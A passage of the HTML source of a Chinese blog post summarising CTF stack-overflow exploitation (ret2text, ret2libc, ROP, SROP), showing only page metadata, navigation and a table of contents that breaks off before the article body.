<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.boychai.xyz","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/google-dark","dark":"base16/google-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="栈基础知识 栈基础概念 栈是程序运行时的一块区域，主要用于存储临时数据、管理函数调用和返回地址。他有很多的特点，他是一种后进先出的数据结构，操作主要有压栈与出栈两种，并且在程序的内存中他的数据是从高地址往低地址走的。简单说，就是程序运行时的“临时记事本”。   栈顶与栈底 对于栈有两个比较重要的寄存器，一个是栈顶一个是栈顶，在32位操作系统中，寄存器EBP表示栈底，ESP表示栈顶。栈底代表当前栈的">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN-栈系列总结">
<meta property="og:url" content="https://blog.boychai.xyz/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="BoyChai&#39;s Blog">
<meta property="og:description" content="栈基础知识 栈基础概念 栈是程序运行时的一块区域，主要用于存储临时数据、管理函数调用和返回地址。他有很多的特点，他是一种后进先出的数据结构，操作主要有压栈与出栈两种，并且在程序的内存中他的数据是从高地址往低地址走的。简单说，就是程序运行时的“临时记事本”。   栈顶与栈底 对于栈有两个比较重要的寄存器，一个是栈顶一个是栈顶，在32位操作系统中，寄存器EBP表示栈底，ESP表示栈顶。栈底代表当前栈的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250510144043.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250510153227.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250510183255.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250510182553.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250510184345.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250405153820.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250405153844.png">
<meta property="og:image" content="https://avatars.githubusercontent.com/u/3533327?s=48&v=4">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250405160713.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250405160748.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250405183241.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250409165746.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250516191757.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250516200746.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250511202230.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250511202258.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250514141852.png">
<meta property="article:published_time" content="2025-05-11T19:34:00.000Z">
<meta property="article:modified_time" content="2025-07-17T05:40:18.600Z">
<meta property="article:author" content="BoyChai">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="栈溢出">
<meta property="article:tag" content="栈漏洞">
<meta property="article:tag" content="ROP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250510144043.png">


<link rel="canonical" href="https://blog.boychai.xyz/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.boychai.xyz/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/","path":"2025/05/11/PWN-栈系列总结/","title":"PWN-栈系列总结"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PWN-栈系列总结 | BoyChai's Blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<link rel="dns-prefetch" href="waline-server-ten-phi.vercel.app">
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="BoyChai's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="headband">
  <a target="_blank" rel="noopener" href="https://github.com/boychai" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
  </div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">BoyChai's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-开往"><a href="https://www.travellings.cn/go.html" rel="section" target="_blank"><i class="fa fa-car fa-fw"></i>开往</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">栈基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">栈基础概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E9%A1%B6%E4%B8%8E%E6%A0%88%E5%BA%95"><span class="nav-number">1.2.</span> <span class="nav-text">栈顶与栈底</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text">函数调用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E9%98%B2%E6%8A%A4"><span class="nav-number">2.</span> <span class="nav-text">系统防护</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NX%E9%98%B2%E6%8A%A4"><span class="nav-number">2.1.</span> <span class="nav-text">NX防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASLR%E9%98%B2%E6%8A%A4"><span class="nav-number">2.2.</span> <span class="nav-text">ASLR防护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BC%80%E5%90%AF%E4%BA%86ASLR%E6%9C%89%E4%BA%9B%E5%9C%B0%E5%9D%80%E8%BF%98%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%EF%BC%9F"><span class="nav-number">2.2.1.</span> <span class="nav-text">为什么开启了ASLR有些地址还是可以直接使用？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PIE%E9%98%B2%E6%8A%A4"><span class="nav-number">2.3.</span> <span class="nav-text">PIE防护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE%E4%B8%8EASLR%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-number">2.3.1.</span> <span class="nav-text">PIE与ASLR的关系</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">3.</span> <span class="nav-text">简单栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">栈溢出漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">ROP-导向编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">3.3.</span> <span class="nav-text">ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="nav-number">3.3.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.3.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">3.3.3.</span> <span class="nav-text">防护措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90"><span class="nav-number">3.3.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">3.3.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="nav-number">3.3.6.</span> <span class="nav-text">溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%94%BB%E5%87%BB"><span class="nav-number">3.3.7.</span> <span class="nav-text">代码攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.4.</span> <span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E7%8E%AF%E5%A2%83"><span class="nav-number">3.4.2.</span> <span class="nav-text">关于环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-1"><span class="nav-number">3.4.3.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">3.4.4.</span> <span class="nav-text">保护措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-1"><span class="nav-number">3.4.5.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-1"><span class="nav-number">3.4.6.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6-1"><span class="nav-number">3.4.7.</span> <span class="nav-text">溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.8.</span> <span class="nav-text">脚本攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.5.</span> <span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-2"><span class="nav-number">3.5.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-2"><span class="nav-number">3.5.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4"><span class="nav-number">3.5.3.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-2"><span class="nav-number">3.5.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-2"><span class="nav-number">3.5.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROPgadget%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.5.6.</span> <span class="nav-text">ROPgadget查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6-2"><span class="nav-number">3.5.7.</span> <span class="nav-text">溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="nav-number">3.5.8.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plt%E4%B8%8Egot"><span class="nav-number">3.6.</span> <span class="nav-text">plt与got</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc1"><span class="nav-number">3.7.</span> <span class="nav-text">ret2libc1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-3"><span class="nav-number">3.7.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-3"><span class="nav-number">3.7.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-1"><span class="nav-number">3.7.3.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-3"><span class="nav-number">3.7.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-3"><span class="nav-number">3.7.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6-3"><span class="nav-number">3.7.6.</span> <span class="nav-text">溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-1"><span class="nav-number">3.7.7.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc2"><span class="nav-number">3.8.</span> <span class="nav-text">ret2libc2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-4"><span class="nav-number">3.8.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-4"><span class="nav-number">3.8.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-2"><span class="nav-number">3.8.3.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-4"><span class="nav-number">3.8.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-4"><span class="nav-number">3.8.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6-4"><span class="nav-number">3.8.6.</span> <span class="nav-text">溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-2"><span class="nav-number">3.8.7.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc3"><span class="nav-number">3.9.</span> <span class="nav-text">ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-5"><span class="nav-number">3.9.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-5"><span class="nav-number">3.9.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-3"><span class="nav-number">3.9.3.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-5"><span class="nav-number">3.9.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-5"><span class="nav-number">3.9.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6-5"><span class="nav-number">3.9.6.</span> <span class="nav-text">溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-3"><span class="nav-number">3.9.7.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc3-search-libc"><span class="nav-number">3.10.</span> <span class="nav-text">ret2libc3-search_libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-6"><span class="nav-number">3.10.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-6"><span class="nav-number">3.10.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-4"><span class="nav-number">3.10.3.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-6"><span class="nav-number">3.10.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-6"><span class="nav-number">3.10.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E4%BD%8D%E6%95%B0"><span class="nav-number">3.10.6.</span> <span class="nav-text">溢出位数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-4"><span class="nav-number">3.10.7.</span> <span class="nav-text">攻击脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-WIKI-EXP%E5%88%86%E6%9E%90"><span class="nav-number">3.10.8.</span> <span class="nav-text">CTF-WIKI-EXP分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x86-32%E4%BD%8D-%E4%B8%8Ex64-64%E4%BD%8D-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.11.</span> <span class="nav-text">x86(32位)与x64(64位)的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level3"><span class="nav-number">3.12.</span> <span class="nav-text">jarvisoj_level3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-7"><span class="nav-number">3.12.1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-7"><span class="nav-number">3.12.2.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-5"><span class="nav-number">3.12.3.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-7"><span class="nav-number">3.12.4.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-7"><span class="nav-number">3.12.5.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-5"><span class="nav-number">3.12.6.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9B%E9%98%B6%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">4.</span> <span class="nav-text">进阶栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2csu"><span class="nav-number">4.1.</span> <span class="nav-text">ret2csu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0"><span class="nav-number">4.1.1.</span> <span class="nav-text">漏洞实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-8"><span class="nav-number">4.1.2.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-8"><span class="nav-number">4.1.3.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-6"><span class="nav-number">4.1.4.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-8"><span class="nav-number">4.1.5.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-8"><span class="nav-number">4.1.6.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-6"><span class="nav-number">4.1.7.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SROP"><span class="nav-number">4.2.</span> <span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">漏洞实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-9"><span class="nav-number">4.2.2.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B-9"><span class="nav-number">4.2.3.</span> <span class="nav-text">文件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 